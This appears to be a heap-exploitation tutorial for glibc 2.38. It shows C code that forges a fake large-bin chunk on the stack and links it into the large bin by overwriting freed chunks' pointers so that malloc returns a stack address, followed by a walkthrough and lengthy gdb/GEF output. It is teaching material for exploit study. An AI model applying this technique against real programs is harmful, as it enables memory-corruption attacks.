# Large Bin Linked List

Similar to the unsorted bin linked list, our goal is to allocate a ptr on the stack from malloc. However this time we will be leveraging the large bin. However, the process will be pretty similar.

Here is the code:

```
#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x420
#define CHUNK_SIZE1 0x080

void main() {
    long *chunk0,
            *chunk1,
            *chunk2;

    long stack_array[140];

    // Allocate, and free three chunks
    // Insert them into the unsorted bin
    // Allocate chunks in between, to prevent consolidation
    chunk0 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk1 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk2 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);

    free(chunk0);
    free(chunk1);
    free(chunk2);

    // Malloc a chunk, larger than any other unsorted bin chunks
    // Move the three chunks over to the large bin
    malloc(CHUNK_SIZE0+0x10);

    // Create the large bin fake chunk header
    stack_array[0] = 0x000;
    stack_array[1] = 0x431;

    // Next up, we will need to add
    // a fake heap chunk header, right after the end of our fake large bin bin chunk
    // This is because, there are checks for the next adjacent chunk
    // Since if malloc properly allocated this chunk, there would be one there
    stack_array[134] = 0x430;
    stack_array[135] = 0x050;

    // Set the fwd/bk pointers of our large bin fake chunk
    // So that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk1 - 0x10); // fwd
    stack_array[3] = ((long)chunk2 - 0x10); // bk

    // Clear out the fd_nextsize/bk_nexsize
    // The large bin skiplist
    stack_array[4] = 0x00;
    stack_array[5] = 0x00;

    chunk1[1] = (long)(stack_array); // bk
    chunk2[0] = (long)(stack_array); // fwd
    
    // Allocate the chunk we inserted after
    malloc(CHUNK_SIZE0);

    // Allocate our fake large bin chunk that is on the stack
    malloc(CHUNK_SIZE0);
}
```

## Walkthrough

This is going to be pretty similar to the unsorted bin linked list demo. The primary differences here include, that we are doing it with large bin chunks instead of the unsorted bin. In addition to that, since we are dealing with large bin chunks, I am having to set the skiplist ptrs (`fd_nextsize/bk_nexsize`) to `0x00`, to prevent issues (if we leave it as whatever was on the stack, it will interpret that data as memory addresses, and try to dereference them, which can cause issues).

So just to recap on how this works. We will get three chunks into the large bin via several mallocs/frees. These three chunks will be the same size. Since they are the same size, only one of these chunks will be in the large bin skip list. Then We will continue with creating a fake chunk on the stack. This includes setting the `prev_size` (`0x00`), chunk size (`0x431`), fwd/bk ptrs, and `skip_list` ptrs (`0x00`). In addition to that, we will need to set the fake chunk header after our chunk (`prev_size` of `0x430` to match our fake chunk size).

After that, we will insert our fake stack large bin chunk into the large bin. For the two large bin chunks not in the skip list, we will simply set the `fwd/bk` pointers to match our fake stack chunk, and vice versa. Since we aren't dealing with skip list chunks, this simplifies the process. With that, we have effectively inserted our fake stack chunk into the large bin.

After that, all that is left is to allocate it. If there are multiple chunks of the same size in the large bin, the large bin will allocate chunks not in the skip list first, so it doesn't have to update the skip list. Since we inserted our chunk in between the two non-skip list chunks, we will have to malloc twice to get our fake stack chunk (once for the chunk before it, then our stack chunk).

With that being said, let's see this in action:

```
$   gdb ./large_linked 
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./large_linked...
(No debugging symbols found in ./large_linked)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000001189 <+0>: endbr64 
   0x000000000000118d <+4>: push   rbp
   0x000000000000118e <+5>: mov    rbp,rsp
   0x0000000000001191 <+8>: sub    rsp,0x490
   0x0000000000001198 <+15>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000011a1 <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000011a5 <+28>:    xor    eax,eax
   0x00000000000011a7 <+30>:    mov    edi,0x420
   0x00000000000011ac <+35>:    call   0x1090 <malloc@plt>
   0x00000000000011b1 <+40>:    mov    QWORD PTR [rbp-0x488],rax
   0x00000000000011b8 <+47>:    mov    edi,0x80
   0x00000000000011bd <+52>:    call   0x1090 <malloc@plt>
   0x00000000000011c2 <+57>:    mov    edi,0x420
   0x00000000000011c7 <+62>:    call   0x1090 <malloc@plt>
   0x00000000000011cc <+67>:    mov    QWORD PTR [rbp-0x480],rax
   0x00000000000011d3 <+74>:    mov    edi,0x80
   0x00000000000011d8 <+79>:    call   0x1090 <malloc@plt>
   0x00000000000011dd <+84>:    mov    edi,0x420
   0x00000000000011e2 <+89>:    call   0x1090 <malloc@plt>
   0x00000000000011e7 <+94>:    mov    QWORD PTR [rbp-0x478],rax
   0x00000000000011ee <+101>:   mov    edi,0x80
   0x00000000000011f3 <+106>:   call   0x1090 <malloc@plt>
   0x00000000000011f8 <+111>:   mov    rax,QWORD PTR [rbp-0x488]
   0x00000000000011ff <+118>:   mov    rdi,rax
   0x0000000000001202 <+121>:   call   0x1070 <free@plt>
   0x0000000000001207 <+126>:   mov    rax,QWORD PTR [rbp-0x480]
   0x000000000000120e <+133>:   mov    rdi,rax
   0x0000000000001211 <+136>:   call   0x1070 <free@plt>
   0x0000000000001216 <+141>:   mov    rax,QWORD PTR [rbp-0x478]
   0x000000000000121d <+148>:   mov    rdi,rax
   0x0000000000001220 <+151>:   call   0x1070 <free@plt>
   0x0000000000001225 <+156>:   mov    edi,0x430
   0x000000000000122a <+161>:   call   0x1090 <malloc@plt>
   0x000000000000122f <+166>:   mov    QWORD PTR [rbp-0x470],0x0
   0x000000000000123a <+177>:   mov    QWORD PTR [rbp-0x468],0x431
   0x0000000000001245 <+188>:   mov    QWORD PTR [rbp-0x40],0x430
   0x000000000000124d <+196>:   mov    QWORD PTR [rbp-0x38],0x50
   0x0000000000001255 <+204>:   mov    rax,QWORD PTR [rbp-0x480]
   0x000000000000125c <+211>:   sub    rax,0x10
   0x0000000000001260 <+215>:   mov    QWORD PTR [rbp-0x460],rax
   0x0000000000001267 <+222>:   mov    rax,QWORD PTR [rbp-0x478]
   0x000000000000126e <+229>:   sub    rax,0x10
   0x0000000000001272 <+233>:   mov    QWORD PTR [rbp-0x458],rax
   0x0000000000001279 <+240>:   mov    QWORD PTR [rbp-0x450],0x0
   0x0000000000001284 <+251>:   mov    QWORD PTR [rbp-0x448],0x0
   0x000000000000128f <+262>:   mov    rax,QWORD PTR [rbp-0x480]
   0x0000000000001296 <+269>:   lea    rdx,[rax+0x8]
   0x000000000000129a <+273>:   lea    rax,[rbp-0x470]
   0x00000000000012a1 <+280>:   mov    QWORD PTR [rdx],rax
   0x00000000000012a4 <+283>:   lea    rdx,[rbp-0x470]
   0x00000000000012ab <+290>:   mov    rax,QWORD PTR [rbp-0x478]
   0x00000000000012b2 <+297>:   mov    QWORD PTR [rax],rdx
   0x00000000000012b5 <+300>:   mov    edi,0x420
   0x00000000000012ba <+305>:   call   0x1090 <malloc@plt>
   0x00000000000012bf <+310>:   mov    edi,0x420
   0x00000000000012c4 <+315>:   call   0x1090 <malloc@plt>
   0x00000000000012c9 <+320>:   nop
   0x00000000000012ca <+321>:   mov    rax,QWORD PTR [rbp-0x8]
   0x00000000000012ce <+325>:   sub    rax,QWORD PTR fs:0x28
   0x00000000000012d7 <+334>:   je     0x12de <main+341>
   0x00000000000012d9 <+336>:   call   0x1080 <__stack_chk_fail@plt>
   0x00000000000012de <+341>:   leave  
   0x00000000000012df <+342>:   ret    
End of assembler dump.
gef➤  b *main+166
Breakpoint 1 at 0x122f
gef➤  b *main+305
Breakpoint 2 at 0x12ba
gef➤  b *main+315
Breakpoint 3 at 0x12c4
gef➤  b *main+320
Breakpoint 4 at 0x12c9
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/large_bin/linked_list/large_linked 
warning: File "/home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
To enable execution of this file add
    add-auto-load-safe-path /home/guy/glibc-2.38/compiled-2.38/lib/libthread_db.so.1
line to your configuration file "/home/guy/.gdbinit".
To completely disable this security protection add
    set auto-load safe-path /
line to your configuration file "/home/guy/.gdbinit".
For more information about this security protection see the
"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
    info "(gdb)Auto-loading safe path"
warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.

Breakpoint 1, 0x000055555555522f in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055555555a0e0  →  0x0000000000000000
$rbx   : 0x0               
$rcx   : 0x441             
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb30  →  0x0000000000000002
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x430             
$rdi   : 0x000055555555a0e0  →  0x0000000000000000
$rip   : 0x000055555555522f  →  <main+166> mov QWORD PTR [rbp-0x470], 0x0
$r8    : 0x3               
$r9    : 0x0               
$r10   : 0x1               
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/large_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64 
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb30│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdb38│+0x0008: 0x00005555555592a0  →  0x0000555555559c10  →  0x0000000000000000
0x00007fffffffdb40│+0x0010: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdb48│+0x0018: 0x0000555555559c20  →  0x0000555555559750  →  0x0000000000000000
0x00007fffffffdb50│+0x0020: 0x00007ffff7fc1388  →  0x00007ffff7ffe5b8  →  0x00007ffff7fc1560  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
0x00007fffffffdb58│+0x0028: 0x00007ffff7c1c6f6  →  "_dl_audit_preinit"
0x00007fffffffdb60│+0x0030: 0x00007fffffffdbf8  →  0x00000000ffffffff
0x00007fffffffdb68│+0x0038: 0x00007fffffffdc00  →  0x00007ffff7fc97b0  →  0x000a00120000000e
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555220 <main+151>       call   0x555555555070 <free@plt>
   0x555555555225 <main+156>       mov    edi, 0x430
   0x55555555522a <main+161>       call   0x555555555090 <malloc@plt>
 → 0x55555555522f <main+166>       mov    QWORD PTR [rbp-0x470], 0x0
   0x55555555523a <main+177>       mov    QWORD PTR [rbp-0x468], 0x431
   0x555555555245 <main+188>       mov    QWORD PTR [rbp-0x40], 0x430
   0x55555555524d <main+196>       mov    QWORD PTR [rbp-0x38], 0x50
   0x555555555255 <main+204>       mov    rax, QWORD PTR [rbp-0x480]
   0x55555555525c <main+211>       sub    rax, 0x10
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "large_linked", stopped 0x55555555522f in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555522f → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[63]: fw=0x555555559290, bk=0x555555559750
 →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559c20, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 3 chunks in 1 large non-empty bins.
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x431
0x5555555592a0: 0x555555559c10  0x7ffff7e2d0f0
0x5555555592b0: 0x555555559290  0x555555559290
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
gef➤  x/20g 0x555555559c10
0x555555559c10: 0x0 0x431
0x555555559c20: 0x555555559750  0x555555559290
0x555555559c30: 0x0 0x0
0x555555559c40: 0x0 0x0
0x555555559c50: 0x0 0x0
0x555555559c60: 0x0 0x0
0x555555559c70: 0x0 0x0
0x555555559c80: 0x0 0x0
0x555555559c90: 0x0 0x0
0x555555559ca0: 0x0 0x0
gef➤  x/20g 0x555555559750
0x555555559750: 0x0 0x431
0x555555559760: 0x7ffff7e2d0f0  0x555555559c10
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
```

So we start off, we see the three large bin chunks with `0x555555559290/0x555555559c10/0x555555559750`. The `0x555555559290` is in the skip list, since we see the two pointers at `0x5555555592b0`. The other two (which in between we will insert our fake large bin chunk) are not in the skip list, since all three are the same size. Let's go ahead, make the fake large bin chunk, and insert it:

```
gef➤  c
Continuing.

Breakpoint 2, 0x00005555555552ba in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559c20  →  0x00007fffffffdb50  →  0x0000000000000000
$rbx   : 0x0               
$rcx   : 0x441             
$rdx   : 0x00007fffffffdb50  →  0x0000000000000000
$rsp   : 0x00007fffffffdb30  →  0x0000000000000002
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x430             
$rdi   : 0x420             
$rip   : 0x00005555555552ba  →  <main+305> call 0x555555555090 <malloc@plt>
$r8    : 0x3               
$r9    : 0x0               
$r10   : 0x1               
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/large_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64 
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb30│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdb38│+0x0008: 0x00005555555592a0  →  0x0000555555559c10  →  0x0000000000000000
0x00007fffffffdb40│+0x0010: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdb48│+0x0018: 0x0000555555559c20  →  0x00007fffffffdb50  →  0x0000000000000000
0x00007fffffffdb50│+0x0020: 0x0000000000000000   ← $rdx
0x00007fffffffdb58│+0x0028: 0x0000000000000431
0x00007fffffffdb60│+0x0030: 0x0000555555559750  →  0x0000000000000000
0x00007fffffffdb68│+0x0038: 0x0000555555559c10  →  0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552ab <main+290>       mov    rax, QWORD PTR [rbp-0x478]
   0x5555555552b2 <main+297>       mov    QWORD PTR [rax], rdx
   0x5555555552b5 <main+300>       mov    edi, 0x420
 → 0x5555555552ba <main+305>       call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64 
      0x555555555094 <malloc@plt+4>   bnd    jmp QWORD PTR [rip+0x2f35]        # 0x555555557fd0 <malloc@got.plt>
      0x55555555509b <malloc@plt+11>  nop    DWORD PTR [rax+rax*1+0x0]
      0x5555555550a0 <_start+0>       endbr64 
      0x5555555550a4 <_start+4>       xor    ebp, ebp
      0x5555555550a6 <_start+6>       mov    r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000420,
   $rsi = 0x0000000000000430,
   $rdx = 0x00007fffffffdb50 → 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "large_linked", stopped 0x5555555552ba in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552ba → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[63]: fw=0x555555559290, bk=0x555555559750
 →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559c20, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x7fffffffdb60, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 4 chunks in 1 large non-empty bins.
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x431
0x5555555592a0: 0x555555559c10  0x7ffff7e2d0f0
0x5555555592b0: 0x555555559290  0x555555559290
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
gef➤  x/20g 0x555555559c10
0x555555559c10: 0x0 0x431
0x555555559c20: 0x7fffffffdb50  0x555555559290
0x555555559c30: 0x0 0x0
0x555555559c40: 0x0 0x0
0x555555559c50: 0x0 0x0
0x555555559c60: 0x0 0x0
0x555555559c70: 0x0 0x0
0x555555559c80: 0x0 0x0
0x555555559c90: 0x0 0x0
0x555555559ca0: 0x0 0x0
gef➤  x/20g 0x7fffffffdb50
0x7fffffffdb50: 0x0 0x431
0x7fffffffdb60: 0x555555559750  0x555555559c10
0x7fffffffdb70: 0x0 0x0
0x7fffffffdb80: 0x2 0x7ffff7fc1a28
0x7fffffffdb90: 0x1 0x0
0x7fffffffdba0: 0x1 0x7ffff7fc1000
0x7fffffffdbb0: 0x7ffff7fc1a28  0x7ffff7fc1000
0x7fffffffdbc0: 0x1 0x7ffff7fc1388
0x7fffffffdbd0: 0x0 0x0
0x7fffffffdbe0: 0x0 0x7ffff7fc9c00
gef➤  x/20g 0x7fffffffdf80
0x7fffffffdf80: 0x430   0x50
0x7fffffffdf90: 0x0 0x0
0x7fffffffdfa0: 0x0 0x0
0x7fffffffdfb0: 0x0 0x4d0903da11196700
0x7fffffffdfc0: 0x1 0x7ffff7c23fbd
0x7fffffffdfd0: 0x7ffff7fc9000  0x555555555189
0x7fffffffdfe0: 0x1ffffe0c0 0x7fffffffe0d8
0x7fffffffdff0: 0x0 0xed300f517ec429ed
0x7fffffffe000: 0x7fffffffe0d8  0x555555555189
0x7fffffffe010: 0x555555557da0  0x7ffff7ffd020
gef➤  x/20g 0x555555559750
0x555555559750: 0x0 0x431
0x555555559760: 0x7ffff7e2d0f0  0x7fffffffdb50
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
```

So we see that our fake large bin chunk at `0x7fffffffdb50` has been inserted. We see the next chunk header after it at `0x7fffffffdf80` (`0x7fffffffdb50 + 0x430 = 0x7fffffffdf80`). We see the bk/fwd pointers we overwrote to insert it, at `0x7fffffffdb50/0x555555559768`. Now, let's go ahead an allocate a chunk from the large bin. It will allocate `0x555555559c10`, since that is the first large bin chunk that isn't in the skip list, that meets the required size:

```
gef➤  c
Continuing.

Breakpoint 3, 0x00005555555552c4 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559c20  →  0x00007fffffffdb50  →  0x0000000000000000
$rbx   : 0x0               
$rcx   : 0x431             
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb30  →  0x0000000000000002
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x420             
$rdi   : 0x420             
$rip   : 0x00005555555552c4  →  <main+315> call 0x555555555090 <malloc@plt>
$r8    : 0x3               
$r9    : 0x77              
$r10   : 0x5d              
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/large_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64 
$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb30│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdb38│+0x0008: 0x00005555555592a0  →  0x00007fffffffdb50  →  0x0000000000000000
0x00007fffffffdb40│+0x0010: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdb48│+0x0018: 0x0000555555559c20  →  0x00007fffffffdb50  →  0x0000000000000000
0x00007fffffffdb50│+0x0020: 0x0000000000000000
0x00007fffffffdb58│+0x0028: 0x0000000000000431
0x00007fffffffdb60│+0x0030: 0x0000555555559750  →  0x0000000000000000
0x00007fffffffdb68│+0x0038: 0x0000555555559290  →  0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552b5 <main+300>       mov    edi, 0x420
   0x5555555552ba <main+305>       call   0x555555555090 <malloc@plt>
   0x5555555552bf <main+310>       mov    edi, 0x420
 → 0x5555555552c4 <main+315>       call   0x555555555090 <malloc@plt>
   ↳  0x555555555090 <malloc@plt+0>   endbr64 
      0x555555555094 <malloc@plt+4>   bnd    jmp QWORD PTR [rip+0x2f35]        # 0x555555557fd0 <malloc@got.plt>
      0x55555555509b <malloc@plt+11>  nop    DWORD PTR [rax+rax*1+0x0]
      0x5555555550a0 <_start+0>       endbr64 
      0x5555555550a4 <_start+4>       xor    ebp, ebp
      0x5555555550a6 <_start+6>       mov    r9, rdx
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
malloc@plt (
   $rdi = 0x0000000000000420
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "large_linked", stopped 0x5555555552c4 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552c4 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[63]: fw=0x555555559290, bk=0x555555559750
 →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x7fffffffdb60, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 3 chunks in 1 large non-empty bins.
gef➤  p $rax
$1 = 0x555555559c20
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x431
0x5555555592a0: 0x7fffffffdb50  0x7ffff7e2d0f0
0x5555555592b0: 0x555555559290  0x555555559290
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
gef➤  x/20g 0x7fffffffdb50
0x7fffffffdb50: 0x0 0x431
0x7fffffffdb60: 0x555555559750  0x555555559290
0x7fffffffdb70: 0x0 0x0
0x7fffffffdb80: 0x2 0x7ffff7fc1a28
0x7fffffffdb90: 0x1 0x0
0x7fffffffdba0: 0x1 0x7ffff7fc1000
0x7fffffffdbb0: 0x7ffff7fc1a28  0x7ffff7fc1000
0x7fffffffdbc0: 0x1 0x7ffff7fc1388
0x7fffffffdbd0: 0x0 0x0
0x7fffffffdbe0: 0x0 0x7ffff7fc9c00
gef➤  x/20g 0x555555559750
0x555555559750: 0x0 0x431
0x555555559760: 0x7ffff7e2d0f0  0x7fffffffdb50
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
```

So we see that the `0x555555559c10` chunk has been allocated. Next up, we see our fake stack chunk. Let's go ahead and allocate it:

```
gef➤  c
Continuing.

Breakpoint 4, 0x00005555555552c9 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdb60  →  0x0000555555559750  →  0x0000000000000000
$rbx   : 0x0               
$rcx   : 0x431             
$rdx   : 0x0               
$rsp   : 0x00007fffffffdb30  →  0x0000000000000002
$rbp   : 0x00007fffffffdfc0  →  0x0000000000000001
$rsi   : 0x420             
$rdi   : 0x00007fffffffdb60  →  0x0000555555559750  →  0x0000000000000000
$rip   : 0x00005555555552c9  →  <main+320> nop 
$r8    : 0x3               
$r9    : 0x77              
$r10   : 0x5d              
$r11   : 0x00007ffff7e2cca0  →  0x0000000000000000
$r12   : 0x00007fffffffe0d8  →  0x00007fffffffe3dc  →  "/Hackery/shogun/pwn_demos/large_bin/linke[...]"
$r13   : 0x0000555555555189  →  <main+0> endbr64 
